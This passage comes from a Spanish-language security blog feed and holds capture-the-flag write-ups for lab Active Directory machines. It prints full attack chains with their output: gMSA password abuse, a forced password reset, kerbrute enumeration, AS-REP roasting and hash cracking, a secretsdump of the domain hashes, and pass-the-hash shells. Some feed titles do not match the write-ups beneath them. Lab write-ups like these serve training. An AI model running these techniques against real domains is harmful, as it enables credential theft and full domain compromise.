QueryPasswordInterval     : 2862.13:38:54.3458092
UnchangedPasswordInterval : 2862.13:33:54.3458092
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Uso de ScriptBlock para ejecutar Comando como el usuario BIR-ADFS-GMSA –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.SecureCurrentPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; , &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
search&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ir-adfs-gmsa&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;—– Cambiando la Password al usuario Tristan Davies ——–&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; net user tristan.davies Password123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;– Conexion una vez cambiada la password –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmiexec.py search.htb/tristan.davies:&lt;span class=&quot;s1&quot;&gt;&apos;Password123$&apos;&lt;/span&gt;@10.10.11.129 &lt;span class=&quot;nt&quot;&gt;-shell-type&lt;/span&gt; cmd  &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.11.129
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SMBv3.0 dialect used
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Launching semi-interactive shell - Careful what you execute
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;search&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ristan.davies

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
4e22ea74086xxxxxxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Machine Rooteada =), que tiemble el examen del OSCP&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="SmbClient," /><category term="SmbMap," /><category term="Enumeracion," /><category term="Excell" /><category term="ByPass" /><category term="Proteccions," /><category term="Kerberoasting" /><category term="Attack," /><category term="Revome" /><category term="Execel" /><category term="Protection," /><category term="Import" /><category term="CA" /><category term="Firefox," /><category term="pfx2john," /><category term="ReadGMSAPassword," /><category term="BloodHound," /><category term="Maquinas" /><category term="Retiradas." /><summary type="html">Search ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-05T00:00:00-03:00</published><updated>2022-06-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/05/Attacktive-THM-AD</id><content type="html" xml:base="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html">&lt;h1 id=&quot;attacktive--try-hack-me&quot;&gt;Attacktive ~ Try Hack Me&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Segundo escaneo para ver los Servicios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-13T11:34:00
|_Not valid after:  2022-12-13T11:34:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-14T11:40:05+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2022-06-14T11:40:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a identificar el nombre de Dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spookysec.local&lt;/code&gt; e introducirlo en nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ping -c 1 spookysec.local
PING spookysec.local (10.10.165.157) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop

2022/06/15 13:01:07 &amp;gt;  Using KDC(s):
2022/06/15 13:01:07 &amp;gt;   spookysec.local:88

2022/06/15 13:01:07 &amp;gt;  [+] svc-admin has no pre auth required.
2022/06/15 13:01:07 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/15 13:01:08 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
2022/06/15 13:01:24 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
2022/06/15 13:01:39 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/15 13:02:07 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/15 13:02:30 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/15 13:02:31 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/15 13:03:06 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
2022/06/15 13:04:51 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-admin&lt;/code&gt; seria vulnerable a un ataque de ASPREPRoast&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
&quot;management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)&quot;     
1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos creamos un archivo de credenciales, con las credenciales obtenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc-admin: management2005
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backup                                                  READ ONLY
        .\backup\*
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cuando Procedemos a descargar el archivo obtenemos un problema.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
0       10.10.165.157-backup__credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount -t cifs //10.10.165.157/backup /mnt/ -o username=&quot;svc-admin&quot;,password=&quot;management2005&quot;,domain=spookysec.local,rw
# ls -la /mnt                     
total 5
drwxr-xr-x  2 root root    0 abr  4  2020 .
drwxr-xr-x 20 root root 4096 may 31 21:36 ..
-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a leer el Archivo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat /mnt/backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# cat /mnt/backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos guardamos las credenciales en el archivo Creds
Procedemos a enumerar con bloodhound.py el directorio activo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python3 bloodhound.py -u svc-admin -p &quot;management2005&quot; -d spookysec.local -ns 10.10.165.157 --zip
INFO: Found AD domain: spookysec.local
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 05S
INFO: Compressing output into 20220615135241_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;

Introducimos nuestras credenciales en Neo4J 
Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
./BloodHound --no-sandbox 2&amp;gt;/dev/null &amp;amp;                                                                                                                                
[2] 3424

Cargamos nuestro .zip
Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar ejecutar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Secretsdumps.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# evil-winrm -i 10.10.165.157 -u &apos;administrator&apos; -H &apos;0e0363213e37b94221497260b0bcb4fc&apos;
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
thm-ad\administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Comprometida AD ~ K0H4ck&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="THM," /><category term="Enumeration," /><category term="SMB," /><category term="Kerbrute" /><category term="Userenum," /><category term="ASPREPRoast" /><category term="Attack," /><category term="Kerberoasting" /><category term="Attack," /><category term="Secretsdumps.py," /><category term="Maquina" /><category term="Gratuitas." /><summary type="html">Attacktive ~ Try Hack Me</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/05/Search-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-05T00:00:00-03:00</published><updated>2022-06-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/05/Search-AD</id><content type="html" xml:base="http://localhost:4000/2022/06/05/Search-AD.html">&lt;h1 id=&quot;querier--hack-the-box&quot;&gt;Querier ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.129       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION                                                                                                       
53/tcp    open  domain        Simple DNSPlus                                                                                                                                                                         
80/tcp    open  http          Microsoft IIS httpd 10.0         
| http-methods:                                                                                          
|_  Potentially risky methods: TRACE                                                                                                                                                                               
|_http-server-header: Microsoft-IIS/10.0     
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                           
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-24 18:38:51Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                     
135/tcp   open  msrpc         Microsoft Windows RPC                                                      
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                        
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                
| Not valid before: 2020-08-11T08:13:35                                                                                                                                                                                                          
|_Not valid after:  2030-08-09T08:13:35                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                            
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0                                                    
| http-methods:                                                                                                         
|_  Potentially risky methods: TRACE                                                                                    
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                                               
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                                                                                             
| Not valid before: 2020-08-11T08:13:35                                                                                               
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
| tls-alpn:                                                                                                                                 
|_  http/1.1                              
445/tcp   open  microsoft-ds?                                                                                 
464/tcp   open  kpasswd5?                          
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                       
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                     
|_Not valid after:  2030-08-09T08:13:35            
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                                                     
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.
